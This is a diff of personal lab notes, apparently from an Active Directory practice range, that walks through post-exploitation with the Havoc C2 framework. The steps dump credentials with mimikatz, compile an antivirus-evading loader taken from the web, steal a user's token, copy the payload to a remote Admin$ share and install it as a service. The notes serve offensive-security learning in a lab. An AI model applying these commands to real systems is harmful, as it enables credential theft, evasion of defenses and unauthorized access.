@@ -214,6 +214,18 @@ ipconfig
 sc_enum
 ```
 
+### Dump Hashes
+
+##### Upload mimikatz to target
+```
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+
+##### run mimikatz
+```
+shell mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+```
+![](../../../../zzAttachments/Pasted%20image%2020250902094030.png)
 ### Impersonate Robb.Stark and Pivot
 ```
 token find
@@ -250,4 +262,78 @@ dir \\192.168.56.11\Admin$\h*
 - It isn't, it's deleted after about 15 seconds
 - did the same steps with a text file and it works, which means defender probably caught and deleted it.
 
-##### Create a new payload
+### Create a new payload to bypass A/V
+
+##### Generate shellcode
+![](../../../../zzAttachments/Pasted%20image%2020250902081907.png)
+
+##### Create/Find a loader
+- found on the web, not mine
+![](../../../../zzAttachments/Pasted%20image%2020250902082820.png)
+
+##### modify the loader
+- found on the web, not mine
+- for this loader "port" is for a python webserver, not the havoc listener
+![](../../../../zzAttachments/Pasted%20image%2020250902081253.png)
+
+
+##### Compile the payload
+- found on the web, not mine
+```
+x86_64-w64-mingw32-g++ --static havoc-loader.cpp -o havoc.exe -lwinhttp -fpermissive 
+```
+![](../../../../zzAttachments/Pasted%20image%2020250902083210.png)
+
+##### Start a python webserver using the "port" in the loader code
+```
+python3 -m http.server 8081
+```
+
+##### Simulate a user clicking the payload or use robb.stark's token
+![](../../../../zzAttachments/Pasted%20image%2020250902083247.png)
+
+### Create a service using robb.stark's token
+
+##### Get the token
+```
+token find
+```
+```
+token steal [PID] [HANDLE]
+```
+
+##### Upload the payload
+```
+cd \\192.168.56.11\admin$
+```
+```
+upload [Path/To/Payload]/[PAYLOAD_NAME.EXE]
+```
+![](../../../../zzAttachments/Pasted%20image%2020250902084933.png)
+
+##### Create the service
+```
+sc_create havoc havoc c:\Windows\havoc.exe havoc 0 2 3 192.168.56.11
+```
+![](../../../../zzAttachments/Pasted%20image%2020250902104446.png)
+
+##### Reboot the system to verify it works
+![](../../../../zzAttachments/Pasted%20image%2020250902104626.png)
+
+##### The service will fail
+- you can restart it with sc_start
+- the payload isn't made for a service and will fail eventually
+```
+sc_start havoc 192.168.56.11
+```
+
+##### Fix it or do it the wrong way
+- Here is the wrong way. (I'm running out of time but I'll revisit this and make the right payload)
+- You have about 30 seconds before the service fails.
+- run the havoc executable before you lose the callback.
+```
+shell c:\Windows\havoc.exe
+```
+
+### Own the Winterfell DC
+
